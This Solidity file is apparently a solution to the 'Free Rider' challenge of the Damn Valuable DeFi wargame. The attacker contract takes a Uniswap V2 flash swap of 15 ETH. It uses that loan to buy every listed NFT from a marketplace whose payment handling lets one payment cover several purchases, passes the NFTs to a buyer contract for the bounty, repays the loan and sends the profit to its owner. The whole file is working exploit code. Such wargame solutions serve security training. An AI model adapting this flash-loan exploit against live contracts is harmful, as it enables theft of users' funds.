// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../DamnValuableNFT.sol";
import "../../DamnValuableToken.sol";
import "../../free-rider/FreeRiderNFTMarketplace.sol";
import "../../free-rider/FreeRiderBuyer.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

interface IWETH9 {
    function deposit() external payable;
    function balanceOf(address addr) external returns (uint256);
    function approve(address addr, uint256 amount) external;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderAttacker {
    DamnValuableNFT private immutable nft;
    IUniswapV2Pair private immutable pair;
    FreeRiderNFTMarketplace private immutable marketplace;
    FreeRiderBuyer private immutable buyer;
    IWETH9 private immutable weth;
    uint256[] private tokenIds;

    address private immutable owner;

    constructor(
        address _nft,
        address _pair,
        address _marketplace,
        address _buyer,
        address _weth,
        uint256[] memory _tokenIds
    ) {
        nft = DamnValuableNFT(_nft);
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        buyer = FreeRiderBuyer(_buyer);
        weth = IWETH9(_weth);
        tokenIds = _tokenIds;

        owner = msg.sender;
    }

    function exploit() external {
        require(msg.sender == owner, "nope");

        pair.swap(15 ether, 0, address(this), "yak");
    }

    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata) external {
        require(msg.sender == address(pair), ":|");
        require(amount0 == 15 ether, ":(");
        require(amount1 == 0, ":)");

        // get eth
        weth.withdraw(15 ether);

        // buy all NFTs for 15 ETH
        marketplace.buyMany{value: 15 ether}(tokenIds);

        // give to partner
        for(uint256 i = 0; i < tokenIds.length; ++i) {
            nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
        }

        // pay back flashloan
        uint256 amountToPayBack = 15.5 ether;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(msg.sender, amountToPayBack);

        // send eth to attacker
        uint contractBalance = address(this).balance;
        (bool sent, ) = owner.call{value: contractBalance}("");
        require(sent, "not sent");
    }

    fallback() external payable {}
    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}